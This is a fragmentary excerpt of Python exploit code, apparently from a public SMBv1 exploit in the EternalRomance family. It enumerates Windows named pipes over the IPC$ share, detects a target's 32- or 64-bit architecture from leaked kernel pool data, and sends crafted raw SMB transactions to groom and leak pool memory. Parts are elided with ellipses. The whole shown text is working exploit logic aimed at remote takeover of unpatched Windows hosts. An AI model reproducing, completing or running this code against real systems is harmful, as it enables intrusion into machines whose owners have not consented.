...
def find_named_pipe(conn):
    pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr', 'atsvc', 'epmapper', 'eventlog', 'keysvc', 'lsass', 'ntsvcs', 'plugplay', 'protected_storage', 'router', 'scerpc', 'srvsvc', 'tapsrv', 'trkwks', 'wkssvc', 'db2remotecmd', 'INitShutdown', 'LSM_API_SERVICE', 'SapiServerPipeS-1-5-5-0-70123', 'W32TIME_ALT', 'PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER']
    
    tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
    found_pipe = pipes[0] #None
    for pipe in pipes:
        try:
...
def leak_frag_size(conn, tid, fid):
    ...
    if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag'.encode('utf-8'):
        print('Target is 32 bit')
        info['arch'] = 'x86'
        info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']
    elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag'.encode('utf-8'):
...
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
    ...
    conn.send_raw(req1[:-8])
    conn.send_raw(req1[-8:]+req2+req3+b''.join(reqs))
    ...
    if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag'.encode('utf-8'):
        print('Not found Frag pool tag in leak data')
        return None
    ...
    if leakData[0x4:0x8] != 'LStr'.encode('utf-8') or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
